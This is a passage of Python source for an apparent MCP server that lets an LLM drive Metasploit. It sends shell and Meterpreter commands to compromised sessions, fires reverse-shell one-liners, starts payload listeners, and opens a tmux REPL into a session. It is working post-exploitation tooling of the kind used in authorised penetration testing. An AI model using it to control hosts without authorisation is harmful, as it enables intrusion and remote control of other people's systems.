                            logger.info("Entering shell mode via write (non-blocking)...")
                            await asyncio.to_thread(lambda: session.write("shell\n"))
                            # Poll para esperar el prompt del OS shell (hasta 5s)
                            shell_init = ""
                            for _ in range(50):  # 50 x 0.1s = 5s max
                                await asyncio.sleep(0.1)
                                chunk = await asyncio.to_thread(lambda: session.read())
                                if chunk:
                                    shell_init += chunk
                                    if any(p in shell_init for p in ['C:\\', '>', '$', '#']):
                                        break
                            session_shell_type[session_id_str] = 'shell'
                            logger.info(f"Shell mode entered (write-based). Init: {shell_init[:100] if shell_init else '(empty)'}")

                        # Enviar one-liner sin esperar output (es una conexión persistente)
                        logger.info("Sending fire-and-forget command (reverse shell one-liner)...")
                        await asyncio.to_thread(lambda: session.write(command + "\n"))
                        await asyncio.sleep(1)

                        output = "✅ Reverse shell one-liner enviado al objetivo. Revisar el listener (netcat/tmux) para la conexión entrante."
                        status = "success"
                        message = "Reverse shell command sent (fire-and-forget). Check listener for connection."
                        command_type = "shell_fire_and_forget"

                    # --- PATH B: Comando OS normal (con lectura de output) ---
                    else:
                        # Enter shell mode if not already in it
                        if session_shell_type[session_id_str] == 'meterpreter':
                            logger.info("Entering shell mode...")
                            shell_output = await asyncio.to_thread(
                                lambda: session.run_with_output("shell", end_strs=['created.'])
                            )
                            session_shell_type[session_id_str] = 'shell'
                            await asyncio.to_thread(lambda: session.read())  # Clear buffer
                            logger.info(f"Shell mode activated: {shell_output[:100]}")

                        # Execute OS command in shell
                        logger.info(f"Executing OS command in shell: {command}")
                        await asyncio.to_thread(lambda: session.write(command + "\n"))
                        await asyncio.sleep(0.5)  # Give command time to execute

                        # Read output with timeout
                        output_buffer = ""
                        start_time = asyncio.get_running_loop().time()
                        last_data_time = start_time

                        while True:
                            now = asyncio.get_running_loop().time()
                            if (now - start_time) > timeout_seconds:
                                status = "timeout"
                                message = f"Command timed out after {timeout_seconds}s. Output may be incomplete."
                                logger.warning(f"OS command '{command}' timed out")
                                break

                            chunk = await asyncio.to_thread(lambda: session.read())
                            if chunk:
                                output_buffer += chunk
                                last_data_time = now
                                # Check for command completion indicators
                                if any(prompt in output_buffer[-100:] for prompt in ['C:\\', '>', '$', '#']):
                                    status = "success"
                                    message = "OS command executed successfully in shell mode."
                                    logger.info(f"OS command completed, output length: {len(output_buffer)}")
                                    break
                            elif (now - last_data_time) > 3.0:  # 3s of inactivity
                                status = "success"
                                message = "Command likely completed (inactivity detected)."
                                logger.info("Inactivity timeout reached, assuming command completed")
                                break

                            await asyncio.sleep(0.1)

                        output = output_buffer.strip()

                # METERPRETER NATIVE COMMANDS
                elif command == "shell":
                    if session_shell_type[session_id_str] == 'meterpreter':
                        raw_output = await asyncio.to_thread(
                            lambda: session.run_with_output(command, end_strs=['created.'])
                        )
                        session_shell_type[session_id_str] = 'shell'
                        await asyncio.to_thread(lambda: session.read())  # Clear buffer
                        status = "success"
                        message = "✅ Successfully entered native OS shell"
                        command_type = "transition"

                        # Build informative output for LLM with session context
                        target_info = session_info.get('target_host', 'unknown')
                        system_info = session_info.get('info', 'unknown')

                        output = f"""✅ NATIVE OS SHELL ACTIVATED

Session #{session_id} → Native Shell
Target: {target_info}
System: {system_info}
Status: Interactive shell ready

Raw Output: {raw_output}

You are now in a native OS command shell (not Meterpreter).
Execute system commands using send_session_command(session_id, "your_command").
Type 'exit' to return to Meterpreter mode."""
                    else:
                        output = "Already in shell mode."
                        status = "success"
                        message = "Already in shell mode."
                        command_type = "transition"

                elif command == "exit":
                    if session_shell_type[session_id_str] == 'shell':
                        await asyncio.to_thread(lambda: session.read())  # Clear buffer
                        session.detach()
                        session_shell_type[session_id_str] = 'meterpreter'
                        output = "Exited shell mode, returned to Meterpreter."
                        status = "success"
                        message = "Exited shell mode."
                        command_type = "transition"
                    else:
                        output = "Already in Meterpreter mode."
                        status = "success"
                        message = "Already in Meterpreter mode."
                        command_type = "transition"

                else:
                    # Execute Meterpreter native command
                    output = await asyncio.wait_for(
                        asyncio.to_thread(lambda: session.run_with_output(command)),
                        timeout=timeout_seconds
                    )
                    status = "success"
                    message = "Meterpreter command executed successfully."
                    command_type = "meterpreter"
                    logger.debug(f"Meterpreter command '{command}' completed.")
            except asyncio.TimeoutError:
                status = "timeout"
                message = f"Meterpreter command timed out after {timeout_seconds} seconds."
                logger.warning(f"Command '{command}' timed out on Meterpreter session {session_id}")
                # Try a final read for potentially partial output
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                except Exception as read_err:
                    logger.debug(f"Error reading session output after timeout: {read_err}")
            except (MsfRpcError, Exception) as run_err:
                logger.error(f"Error during Meterpreter run_with_output for command '{command}': {run_err}")
                message = f"Error executing Meterpreter command: {run_err}"
                # Try a final read
                try:
                    output = await asyncio.to_thread(lambda: session.read()) or ""
                except Exception as read_err:
                    logger.debug(f"Error reading session output after error: {read_err}")

        elif session_type == 'shell':
            logger.debug(f"Using manual read loop for Shell session {session_id}")
            try:
                await asyncio.to_thread(lambda: session.write(command + "\n"))

                # If the command is exit, don't wait for output/prompt, assume it worked
                if command.strip().lower() == 'exit':
                    logger.info(f"Sent 'exit' to shell session {session_id}, assuming success without reading output.")
                    status = "success"
                    message = "Exit command sent to shell session."
                    output = "(No output expected after exit)"
                    # Skip the read loop for exit command
                    return {"status": status, "message": message, "output": output}

                # Proceed with read loop for non-exit commands
                output_buffer = ""
                start_time = asyncio.get_running_loop().time()
                last_data_time = start_time
                read_interval = 0.1

                while True:
                    now = asyncio.get_running_loop().time()
                    if (now - start_time) > timeout_seconds:
                        status = "timeout"
                        message = f"Shell command timed out after {timeout_seconds} seconds."
                        logger.warning(f"Command '{command}' timed out on Shell session {session_id}")
                        break

                    chunk = await asyncio.to_thread(lambda: session.read())
                    if chunk:
                         output_buffer += chunk
                         last_data_time = now
                         # Check if the prompt appears at the end of the current buffer
                         if SHELL_PROMPT_RE.search(output_buffer):
                             logger.debug(f"Detected shell prompt for command '{command}'.")
                             status = "success"
                             message = "Shell command executed successfully."
                             break
                    elif (now - last_data_time) > SESSION_READ_INACTIVITY_TIMEOUT:
                         logger.debug(f"Shell inactivity timeout ({SESSION_READ_INACTIVITY_TIMEOUT}s) reached for command '{command}'. Assuming complete.")
                         status = "success" # Assume success if inactive after sending command
                         message = "Shell command likely completed (inactivity)."
                         break

                    await asyncio.sleep(read_interval)
                output = output_buffer # Assign final buffer to output
            except (MsfRpcError, Exception) as run_err:
                # Special handling for errors after sending 'exit'
                if command.strip().lower() == 'exit':
                    logger.warning(f"Error occurred after sending 'exit' to shell {session_id}: {run_err}. This might be expected as session closes.")
                    status = "success" # Treat as success
                    message = f"Exit command sent, subsequent error likely due to session closing: {run_err}"
                    output = "(Error reading after exit, likely expected)"
                else:
                    logger.error(f"Error during Shell write/read loop for command '{command}': {run_err}")
                    message = f"Error executing Shell command: {run_err}"
                    output = output_buffer # Return potentially partial output

        else: # Unknown session type
            logger.warning(f"Cannot execute command: Unknown session type '{session_type}' for session {session_id}")
            message = f"Cannot execute command: Unknown session type '{session_type}'."
            command_type = "unknown"

        return {
            "status": status,
            "message": message,
            "output": output,
            "command_type": command_type if 'command_type' in locals() else "unknown"
        }

    except MsfRpcError as e:
        if "Session ID is not valid" in str(e):
             logger.error(f"RPC Error: Session {session_id} is invalid: {e}")
             return {"status": "error", "message": f"Session {session_id} is not valid."}
        logger.error(f"MsfRpcError interacting with session {session_id}: {e}")
        return {"status": "error", "message": f"Error interacting with session {session_id}: {e}"}
    except KeyError: # May occur if session disappears between list and access
        logger.error(f"Session {session_id} likely disappeared (KeyError).")
        return {"status": "error", "message": f"Session {session_id} not found or disappeared."}
    except Exception as e:
        logger.exception(f"Unexpected error sending command to session {session_id}.")
        return {"status": "error", "message": f"Unexpected server error sending command: {e}"}


# --- Interactive Session Access ---

@mcp.tool()
async def attach_session_interactive(session_id: int) -> Dict[str, Any]:
    """
    Crea una sesión tmux interactiva con un REPL para acceder manualmente a una sesión Meterpreter.

    Después de llamar a esta función, conecta con:
        tmux attach -t <nombre_de_sesion_retornado>

    Permite ejecutar comandos Meterpreter interactivamente desde tu terminal.
    Escribe 'shell' para entrar al shell del SO, 'quit' para desconectar.

    Args:
        session_id: ID de la sesión Meterpreter (obtener de list_active_sessions o run_exploit)

    Returns:
        Información de la sesión tmux creada incluyendo el comando para conectar.
    """
    client = get_msf_client()

    # Verificar que la sesión existe
    current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
    session_id_str = str(session_id)
    if session_id_str not in current_sessions:
        return {"status": "error", "message": f"Session {session_id} not found.", "output": ""}

    session_info = current_sessions[session_id_str]
    target = session_info.get('target_host', '?')
    info = session_info.get('info', '?')
    s_type = session_info.get('type', '?')
    exploit = session_info.get('via_exploit', '?')

    # Generar nombre tmux y path del script
    timestamp = datetime.now().strftime("%Y%m%d-%H%M%S")
    tmux_name = f"Unburden-msf-{session_id}-{timestamp}"

    script_dir = "/tmp/unburden"
    os.makedirs(script_dir, exist_ok=True)
    script_path = os.path.join(script_dir, f"repl_{session_id}_{timestamp.replace('-', '')}.py")

    # --- REPL script template (placeholders sustituidos por .replace) ---
    repl_script = '''#!/usr/bin/env python3
"""Unburden - Interactive Meterpreter Session REPL (auto-generated)"""
import sys, time

try:
    from pymetasploit3.msfrpc import MsfRpcClient, MsfRpcError
except ImportError:
    print("[!] pymetasploit3 not found. Ensure the virtualenv is active.")
    sys.exit(1)

# --- Injected config ---
_PASS = "__MSF_PASS__"
_HOST = "__MSF_HOST__"
_PORT = __MSF_PORT__
_SSL  = __MSF_SSL__
_SID  = "__SID__"
_SN   = __SN__

def _connect():
    return MsfRpcClient(_PASS, host=_HOST, port=_PORT, ssl=_SSL)

def _read_shell(session, inactivity=3):
    """Lee output del shell hasta que no haya datos por 'inactivity' segundos."""
    buf, deadline = "", time.time() + inactivity
    while time.time() < deadline:
        chunk = session.read()
        if chunk:
            buf += chunk
            deadline = time.time() + inactivity  # Reset on new data
        else:
            time.sleep(0.1)
    return buf

try:
    client = _connect()
    if _SID not in client.sessions.list:
        print(f"[!] Session #{_SN} not found in MSF.")
        sys.exit(1)

    sinfo = client.sessions.list[_SID]
    print()
    print("=" * 62)
    print("  Unburden - Interactive Meterpreter REPL")
    print("=" * 62)
    print(f"  Session : #{_SN}")
    print(f"  Type    : {sinfo.get('type', '?')}")
    print(f"  Target  : {sinfo.get('target_host', '?')}")
    print(f"  Info    : {sinfo.get('info', '?')}")
    print(f"  Exploit : {sinfo.get('via_exploit', '?')}")
    print("=" * 62)
    print("  shell  -> Entrar al shell del SO")
    print("  quit   -> Desconectar")
    print("  Ctrl+C -> Interrumpir comando actual")
    print("=" * 62)
    print()

    session = client.sessions.session(_SID)
    in_shell = False

    while True:
        try:
            prompt = f"msf#{_SN}(shell)> " if in_shell else f"msf#{_SN}> "
            cmd = input(prompt)
            cmd_s = cmd.strip()

            if cmd_s.lower() in ('quit', 'exit', 'q'):
                print(f"[*] Disconnected from session #{_SN}.")
                break

            if not cmd_s:
                continue

            # --- Entrar al OS shell ---
            if cmd_s.lower() == 'shell' and not in_shell:
                print("[*] Entering OS shell... (type 'exit' to return to Meterpreter)")
                session.write("shell\\n")
                time.sleep(1)
                init = _read_shell(session, inactivity=3)
                if init:
                    print(init, end="")
                in_shell = True
                continue

            # --- Dentro del OS shell ---
            if in_shell:
                if cmd_s.lower() == 'exit':
                    session.write("exit\\n")
                    time.sleep(1)
                    session.read()  # clear
                    in_shell = False
                    print("[*] Returned to Meterpreter.")
                    continue
                session.write(cmd + "\\n")
                out = _read_shell(session, inactivity=5)
                if out:
                    print(out, end="")
                continue

            # --- Comando Meterpreter nativo ---
            out = session.run_with_output(cmd_s)
            if out:
                print(out, end="")

        except KeyboardInterrupt:
            print("\\n[!] Use 'quit' to exit.")
        except MsfRpcError as e:
            print(f"[!] MSF RPC Error: {e}")
            try:
                client = _connect()
                session = client.sessions.session(_SID)
                print("[*] Reconnected to MSF.")
            except Exception:
                print("[!] Reconnection failed. Exiting.")
                break
        except Exception as e:
            print(f"[!] Error: {e}")

except Exception as e:
    print(f"[!] Fatal: {e}")
    sys.exit(1)
'''

    # Sustituir placeholders con valores reales
    repl_script = repl_script.replace('__MSF_PASS__', MSF_PASSWORD)
    repl_script = repl_script.replace('__MSF_HOST__', MSF_SERVER)
    repl_script = repl_script.replace('__MSF_PORT__', MSF_PORT_STR)
    repl_script = repl_script.replace('__MSF_SSL__', str(MSF_SSL_STR.lower() == 'true'))
    repl_script = repl_script.replace('__SID__', session_id_str)
    repl_script = repl_script.replace('__SN__', str(session_id))

    # Escribir script al disco
    try:
        with open(script_path, 'w') as f:
            f.write(repl_script)
        os.chmod(script_path, 0o755)
    except Exception as e:
        logger.error(f"Failed to write REPL script: {e}")
        return {"status": "error", "message": f"Error writing REPL script: {e}", "output": ""}

    # Crear sesión tmux y lanzar el REPL
    python_path = sys.executable
    try:
        cr = subprocess.run(
            ['tmux', 'new-session', '-d', '-s', tmux_name],
            capture_output=True, text=True, timeout=5
        )
        if cr.returncode != 0:
            return {"status": "error", "message": f"tmux session creation failed: {cr.stderr}", "output": ""}

        subprocess.run(
            ['tmux', 'send-keys', '-t', tmux_name, f'{python_path} {script_path}', 'Enter'],
            capture_output=True, text=True, timeout=5
        )

        logger.info(f"Interactive REPL session created: tmux:{tmux_name}")

        return {
            "status": "success",
            "message": "Interactive Meterpreter REPL session created.",
            "output": (
                f"📌 REPL interactivo listo.\n\n"
                f"Para conectar desde tu terminal:\n"
                f"  tmux attach -t {tmux_name}\n\n"
                f"Sesión #{session_id} | {s_type} | Target: {target}\n"
                f"Info: {info} | Exploit: {exploit}\n\n"
                f"Comandos disponibles: meterpreter commands | 'shell' -> OS shell | 'quit' -> salir"
            )
        }

    except subprocess.TimeoutExpired:
        logger.error("tmux command timeout creating interactive session")
        return {"status": "error", "message": "tmux command timed out.", "output": ""}
    except Exception as e:
        logger.error(f"Error creating interactive session: {e}")
        return {"status": "error", "message": f"Error: {e}", "output": ""}


# --- Job and Listener Management Tools ---

@mcp.tool()
async def list_listeners() -> Dict[str, Any]:
    """List all active Metasploit jobs, categorizing exploit/multi/handler jobs."""
    client = get_msf_client()
    logger.info("Listing active listeners/jobs")
    try:
        logger.debug(f"Calling client.jobs.list with {RPC_CALL_TIMEOUT}s timeout...")
        jobs = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.jobs.list),
            timeout=RPC_CALL_TIMEOUT
        )
        if not isinstance(jobs, dict):
            logger.error(f"Unexpected data type for jobs list: {type(jobs)}")
            return {"status": "error", "message": f"Unexpected data type for jobs list: {type(jobs)}"}

        logger.info(f"Retrieved {len(jobs)} active jobs from MSF.")
        handlers = {}
        other_jobs = {}

        for job_id, job_info in jobs.items():
            job_id_str = str(job_id)
            job_data = { 'job_id': job_id_str, 'name': 'Unknown', 'details': job_info } # Store raw info

            is_handler = False
            if isinstance(job_info, dict):
                 job_data['name'] = job_info.get('name', 'Unknown Job')
                 job_data['start_time'] = job_info.get('start_time') # Keep if useful
                 datastore = job_info.get('datastore', {})
                 if isinstance(datastore, dict): job_data['datastore'] = datastore # Include datastore

                 # Primary check: module path in name or info
                 job_name_or_info = (job_info.get('name', '') + job_info.get('info', '')).lower()
                 if 'exploit/multi/handler' in job_name_or_info:
                     is_handler = True
                 # Secondary check: presence of typical handler options
                 elif 'payload' in datastore or ('lhost' in datastore and 'lport' in datastore):
                     is_handler = True
                     logger.debug(f"Job {job_id_str} identified as potential handler via datastore options.")

            if is_handler:
                 logger.debug(f"Categorized job {job_id_str} as a handler.")
                 handlers[job_id_str] = job_data
            else:
                 logger.debug(f"Categorized job {job_id_str} as non-handler.")
                 other_jobs[job_id_str] = job_data

        return {
            "status": "success",
            "handlers": handlers,
            "other_jobs": other_jobs,
            "handler_count": len(handlers),
            "other_job_count": len(other_jobs),
            "total_job_count": len(jobs)
        }

    except asyncio.TimeoutError:
        error_msg = f"Timeout ({RPC_CALL_TIMEOUT}s) while listing jobs from Metasploit server. Server may be slow or unresponsive."
        logger.error(error_msg)
        return {"status": "error", "message": error_msg}
    except MsfRpcError as e:
        logger.error(f"Metasploit RPC error while listing jobs/handlers: {e}")
        return {"status": "error", "message": f"Metasploit RPC error: {e}"}
    except Exception as e:
        logger.exception("Unexpected error listing jobs/handlers.")
        return {"status": "error", "message": f"Unexpected server error listing jobs: {e}"}

@mcp.tool()
async def start_listener(
    payload_type: str,
    lhost: str,
    lport: int,
    additional_options: Optional[Union[Dict[str, Any], str]] = None,
    exit_on_session: bool = False # Option to keep listener running
) -> Dict[str, Any]:
    """
    Start a new Metasploit handler (exploit/multi/handler) as a background job.

    Args:
        payload_type: The payload to handle (e.g., 'windows/meterpreter/reverse_tcp').
        lhost: Listener host address.
        lport: Listener port (1-65535).
        additional_options: Optional dict of additional payload options (e.g., {"LURI": "/path"})
                           or string format "LURI=/path,HandlerSSLCert=cert.pem". Prefer dict format.
        exit_on_session: If True, handler exits after first session. If False (default), it keeps running.

    Returns:
        Dictionary with handler status (job_id) or error details.
    """
    logger.info(f"Request to start listener for {payload_type} on {lhost}:{lport}. ExitOnSession: {exit_on_session}")

    if not (1 <= lport <= 65535):
        return {"status": "error", "message": "Invalid LPORT. Must be between 1 and 65535."}

    # Parse additional options gracefully
    try:
        parsed_additional_options = _parse_options_gracefully(additional_options)
    except ValueError as e:
        return {"status": "error", "message": f"Invalid additional_options format: {e}"}

    # exploit/multi/handler options
    module_options = {'ExitOnSession': exit_on_session}
    # Payload options (passed within the payload_spec)
    payload_options = parsed_additional_options
    payload_options['LHOST'] = lhost
    payload_options['LPORT'] = lport

    payload_spec = {"name": payload_type, "options": payload_options}

    # Use the RPC helper to start the handler job
    result = await _execute_module_rpc(
        module_type='exploit',
        module_name='multi/handler', # Use base name for helper
        module_options=module_options,
        payload_spec=payload_spec
    )

    # Rename status/message slightly for clarity
    if result.get("status") == "success":
         result["message"] = f"Listener for {payload_type} started as job {result.get('job_id')} on {lhost}:{lport}."
    elif result.get("status") == "warning": # e.g., job started but polling failed (not applicable here but handle)
         result["message"] = f"Listener job {result.get('job_id')} started, but encountered issues: {result.get('message')}"
    else: # Error case
         result["message"] = f"Failed to start listener: {result.get('message')}"

    return result

@mcp.tool()
async def stop_job(job_id: int) -> Dict[str, Any]:
    """
    Stop a running Metasploit job (handler or other). Verifies disappearance.
    """
    client = get_msf_client()
    logger.info(f"Attempting to stop job {job_id}")
    job_id_str = str(job_id)
    job_name = "Unknown"

    try:
        # Check if job exists and get name
        jobs_before = await asyncio.to_thread(lambda: client.jobs.list)
        if job_id_str not in jobs_before:
            logger.error(f"Job {job_id} not found, cannot stop.")
            return {"status": "error", "message": f"Job {job_id} not found."}
        if isinstance(jobs_before.get(job_id_str), dict):
             job_name = jobs_before[job_id_str].get('name', 'Unknown Job')

        # Attempt to stop the job
        logger.debug(f"Calling jobs.stop({job_id_str})")
        stop_result_str = await asyncio.to_thread(lambda: client.jobs.stop(job_id_str))
        logger.debug(f"jobs.stop() API call returned: {stop_result_str}")

        # Verify job stopped by checking list again
        await asyncio.sleep(1.0) # Give MSF time to process stop
        jobs_after = await asyncio.to_thread(lambda: client.jobs.list)
        job_stopped = job_id_str not in jobs_after

        if job_stopped:
            logger.info(f"Successfully stopped job {job_id} ('{job_name}') - verified by disappearance")
            return {
                "status": "success",
                "message": f"Successfully stopped job {job_id} ('{job_name}')",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str
            }
        else:
            # Job didn't disappear. The API result string might give a hint, but is unreliable.
            logger.error(f"Failed to stop job {job_id}. Job still present after stop attempt. API result: '{stop_result_str}'")
            return {
                "status": "error",
                "message": f"Failed to stop job {job_id}. Job may still be running. API result: '{stop_result_str}'",
                "job_id": job_id,
                "job_name": job_name,
                "api_result": stop_result_str
            }

    except MsfRpcError as e:
        logger.error(f"MsfRpcError stopping job {job_id}: {e}")
        return {"status": "error", "message": f"Error stopping job {job_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error stopping job {job_id}.")
        return {"status": "error", "message": f"Unexpected server error stopping job {job_id}: {e}"}

@mcp.tool()
async def terminate_session(session_id: int) -> Dict[str, Any]:
    """
    Forcefully terminate a Metasploit session using the session.stop() method.
    
    Args:
        session_id: ID of the session to terminate.
        
    Returns:
        Dictionary with status and result message.
    """
    client = get_msf_client()
    session_id_str = str(session_id)
    logger.info(f"Terminating session {session_id}")
    
    try:
        # Check if session exists
        current_sessions = await asyncio.to_thread(lambda: client.sessions.list)
        if session_id_str not in current_sessions:
            logger.error(f"Session {session_id} not found.")
            return {"status": "error", "message": f"Session {session_id} not found."}
            
        # Get a handle to the session
        session = await asyncio.to_thread(lambda: client.sessions.session(session_id_str))
        
        # Stop the session
        await asyncio.to_thread(lambda: session.stop())
        
        # Verify termination
        await asyncio.sleep(1.0)  # Give MSF time to process termination
        current_sessions_after = await asyncio.to_thread(lambda: client.sessions.list)
        
        if session_id_str not in current_sessions_after:
            logger.info(f"Successfully terminated session {session_id}")
            return {"status": "success", "message": f"Session {session_id} terminated successfully."}
        else:
            logger.warning(f"Session {session_id} still appears in the sessions list after termination attempt.")
            return {"status": "warning", "message": f"Session {session_id} may not have been terminated properly."}
            
    except MsfRpcError as e:
        logger.error(f"MsfRpcError terminating session {session_id}: {e}")
        return {"status": "error", "message": f"Error terminating session {session_id}: {e}"}
    except Exception as e:
        logger.exception(f"Unexpected error terminating session {session_id}")
        return {"status": "error", "message": f"Unexpected error terminating session {session_id}: {e}"}

# --- FastAPI Application Setup ---

app = FastAPI(
    title="Metasploit MCP Server (Streamlined)",
    description="Provides core Metasploit functionality via the Model Context Protocol.",
    version="1.6.0", # Incremented version
)

# Setup MCP transport (SSE for HTTP mode)
sse = SseServerTransport("/messages/")

# Define ASGI handlers properly with Starlette's ASGIApp interface
class SseEndpoint:
    async def __call__(self, scope, receive, send):
        """Handle Server-Sent Events connection for MCP communication."""
        client_host = scope.get('client')[0] if scope.get('client') else 'unknown'
        client_port = scope.get('client')[1] if scope.get('client') else 'unknown'
        logger.info(f"New SSE connection from {client_host}:{client_port}")
        async with sse.connect_sse(scope, receive, send) as (read_stream, write_stream):
            await mcp._mcp_server.run(read_stream, write_stream, mcp._mcp_server.create_initialization_options())
        logger.info(f"SSE connection closed from {client_host}:{client_port}")

class MessagesEndpoint:
    async def __call__(self, scope, receive, send):
        """Handle client POST messages for MCP communication."""
        client_host = scope.get('client')[0] if scope.get('client') else 'unknown'
        client_port = scope.get('client')[1] if scope.get('client') else 'unknown'
        logger.info(f"Received POST message from {client_host}:{client_port}")
        await sse.handle_post_message(scope, receive, send)

# Create routes using the ASGIApp-compliant classes
mcp_router = Router([
    Route("/sse", endpoint=SseEndpoint(), methods=["GET"]),
    Route("/messages/", endpoint=MessagesEndpoint(), methods=["POST"]),
])

# Mount the MCP router to the main app
app.routes.append(Mount("/", app=mcp_router))

@app.get("/healthz", tags=["Health"])
async def health_check():
    """Check connectivity to the Metasploit RPC service."""
    try:
        client = get_msf_client() # Will raise ConnectionError if not init
        logger.debug(f"Executing health check MSF call (core.version) with {RPC_CALL_TIMEOUT}s timeout...")
        # Use a lightweight call like core.version
        version_info = await asyncio.wait_for(
            asyncio.to_thread(lambda: client.core.version),
            timeout=RPC_CALL_TIMEOUT
        )
        msf_version = version_info.get('version', 'N/A') if isinstance(version_info, dict) else 'N/A'
        logger.info(f"Health check successful. MSF Version: {msf_version}")
        return {"status": "ok", "msf_version": msf_version}
    except asyncio.TimeoutError:
        error_msg = f"Health check timeout ({RPC_CALL_TIMEOUT}s) - Metasploit server is not responding"
        logger.error(error_msg)
        raise HTTPException(status_code=503, detail=error_msg)
    except (MsfRpcError, ConnectionError) as e:
        logger.error(f"Health check failed - MSF RPC connection error: {e}")
        raise HTTPException(status_code=503, detail=f"Metasploit Service Unavailable: {e}")
    except Exception as e:
        logger.exception("Unexpected error during health check.")
        raise HTTPException(status_code=500, detail=f"Internal Server Error during health check: {e}")

# --- Server Startup Logic ---

def find_available_port(start_port, host='127.0.0.1', max_attempts=10):
    """Finds an available TCP port."""
    for port in range(start_port, start_port + max_attempts):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind((host, port))
                logger.debug(f"Port {port} on {host} is available.")
                return port
            except socket.error:
                logger.debug(f"Port {port} on {host} is in use, trying next.")
                continue
    logger.warning(f"Could not find available port in range {start_port}-{start_port+max_attempts-1} on {host}. Using default {start_port}.")
    return start_port

if __name__ == "__main__":
    # Initialize MSF Client - Critical for server function
    try:
        initialize_msf_client()
    except (ValueError, ConnectionError, RuntimeError) as e:
        logger.critical(f"CRITICAL: Failed to initialize Metasploit client on startup: {e}. Server cannot function.")
        sys.exit(1) # Exit if MSF connection fails at start

    # --- Setup argument parser for transport mode and server configuration ---
    import argparse
    
    parser = argparse.ArgumentParser(description='Run Streamlined Metasploit MCP Server')
    parser.add_argument(
        '--transport', 
        choices=['http', 'stdio'], 
        default='stdio',
        help='MCP transport mode to use (http=SSE, stdio=direct pipe)'
    )
    parser.add_argument('--host', default='127.0.0.1', help='Host to bind the HTTP server to (default: 127.0.0.1)')
    parser.add_argument('--port', type=int, default=None, help='Port to listen on (default: find available from 8085)')
    parser.add_argument('--reload', action='store_true', help='Enable auto-reload (for development)')
    parser.add_argument('--find-port', action='store_true', help='Force finding an available port starting from --port or 8085')
    args = parser.parse_args()

    if args.transport == 'stdio':
        try:
            mcp.run(transport="stdio")
        except Exception as e:
            logger.exception("Error during MCP stdio run loop.")
            sys.exit(1)
    else:  # HTTP/SSE mode (default)
        logger.info("Starting MCP server in HTTP/SSE transport mode.")
        
        # Check port availability
        check_host = args.host if args.host != '0.0.0.0' else '127.0.0.1'
        selected_port = args.port
        if selected_port is None or args.find_port:
            start_port = selected_port if selected_port is not None else 8085
            selected_port = find_available_port(start_port, host=check_host)

        logger.info(f"Starting Uvicorn HTTP server on http://{args.host}:{selected_port}")
        logger.info(f"MCP SSE Endpoint: /sse")
        logger.info(f"API Docs available at http://{args.host}:{selected_port}/docs")
        logger.info(f"Payload Save Directory: {PAYLOAD_SAVE_DIR}")
        logger.info(f"Auto-reload: {'Enabled' if args.reload else 'Disabled'}")

        uvicorn.run(
            "__main__:app",
            host=args.host,
            port=selected_port,
            reload=args.reload,
            log_level="info"
        )
